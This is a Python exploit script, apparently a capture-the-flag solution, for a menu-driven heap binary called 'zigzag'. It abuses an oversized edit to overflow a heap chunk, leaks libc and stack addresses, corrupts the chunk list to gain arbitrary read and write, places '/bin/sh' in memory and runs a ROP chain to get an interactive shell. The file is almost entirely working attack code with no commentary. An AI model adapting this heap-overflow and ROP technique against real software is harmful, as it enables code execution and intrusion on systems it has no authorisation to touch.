#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./zigzag")
host = args.HOST or "0.0.0.0"
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
b *0x0000000000203A7F
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()


def cmd(choice):
    sla(b"> ", choice)


def add(idx, size, data):
    cmd(1)
    sla("Index: ", idx)
    sla("Size: ", size)
    sa("Data: ", data)


def delete(idx):
    cmd(2)
    sla("Index: ", idx)


def show(idx):
    cmd(3)
    sla("Index: ", idx)


def edit(idx, size, data):
    cmd(4)
    sla("Index: ", idx)
    sla("Size: ", size)
    sa("Data: ", data)


add(0, 0x10, b"A" * 0x10)
edit(0, 0x1010, b"A" * 0x10)
show(0)
ren(0x1000)
libc.address = Get() - 0x1000
lb()
edit(0, 0x1060, b"\x00" * 0x1000 + p(0x205FF0) * 2 + p(0x208000) + p(0x20002) + p(3))
add(1, 0x10, b"\x00")
chunklist = 0x208128
argv_ptr = 0x205000
payload = b"\x00" * 0x108 + p(chunklist) + p(0x100) + p(argv_ptr) + p(0x100)
edit(1, 0x1010, payload)
show(1)
stack_leak = Get()
success(f"stack leak : {hex(stack_leak)}")
payload = (
    p(chunklist)
    + p(0x100)
    + p(stack_leak - 0xC8 - 8)
    + p(0x100)
    + p(chunklist - 0x100)
    + p(0x150)
    + b"/bin/sh\x00"
)
edit(0, 0x1010, payload)

xor_eax_eax = 0x000000002037E8
pop_rax_syscall = 0x00000000201FCF
binsh = 0x208158

rop = flat(
    [
        0x00000000201FCF,
        0x0,
        pop("rdi", binsh),
        pop("rsi", 0x0),
        0x00000000203B76,
        0,
        0xCAFEBABE,
    ]
)

edit(2, 0x150, rop)
pause()
edit(
    1,
    0x150,
    p(0)
    + p(0x0000000000203A7F)
    + p(chunklist - 0x100 - 8 - 8)
    + p(1)
    + p(2)
    + p(3)
    + p(0xDEADBEEF),
)
pause()
s(b"a" * 0x3B)
io.interactive()
